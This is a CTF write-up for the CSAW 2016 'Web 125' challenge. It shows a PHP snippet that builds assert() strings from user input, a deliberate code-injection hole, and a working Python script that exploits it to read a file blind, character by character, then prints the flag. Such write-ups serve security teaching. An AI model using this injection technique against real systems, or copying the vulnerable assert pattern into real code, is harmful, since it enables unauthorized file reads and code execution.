---
layout: post
title:  "CSAW CTF 2016"
subtitle: 'Web 125 - Assert() Vulnerability'
date:   2016-09-16 00:06:31
tags:
- CSAW CTF 2016, Assert Vulnerability
---

In this challenge, we were given a web page showing `Welcome to my website! I wrote it myself from scratch!.` Next was to find the vulnerability in the page.

`Challenge URL: http://web.chal.csaw.io:8000/`

Obviously the first thing was to look at the source code and found something commented out
`<br /><!--<li ><a href="?page=flag">My secrets</a></li>`

My next aim was to get that using LFI, but it failed as they were filtering off and produced a message Detected hacking attempt! I was sure that there was a `git` page as he had mentioned it in the about page which would get me the full source code. I was successfully able to find the source code which was

```
#A part of the source code
<?php

if (isset($_GET['page'])) {
$page = $_GET['page'];
} else {
$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
```

I was able to understand that it was using `assert()` which was vulnerable to LFI. I wrote a little script:

```
<br />
#Author Gokul Krishna
#teambi0s

import base64
import string
import requests

url = "http://web.chal.csaw.io:8000/"

def check(payload):
r = requests.get(url, params={'page':payload})
return "Detected" not in r.text
base = '\', "asdf") === false && %s && strpos(\'1'

def get_len(path):
for i in range(2048):
print "Length upto %d" % i
s = 'strlen(file_get_contents("%s")) == %d' % (path, i)
if check(base % s):
print "Found Length %d" % i
return i

def get_str(path):
length = get_len(path)
s = "<?php"
while len(s) < length:
for c in string.printable:
t_s = s + c
payload = 'substr(file_get_contents("%s"), 0, %d) == base64_decode("%s")' % (path, len(t_s), base64.b64encode(t_s))
if check(base % payload):
s += c
print c
print s.replace("\n", " ")
return s

print get_str("templates/flag.php");
```

Flag is: `flag{3vald_@ss3rt_1s_best_a$$ert}`
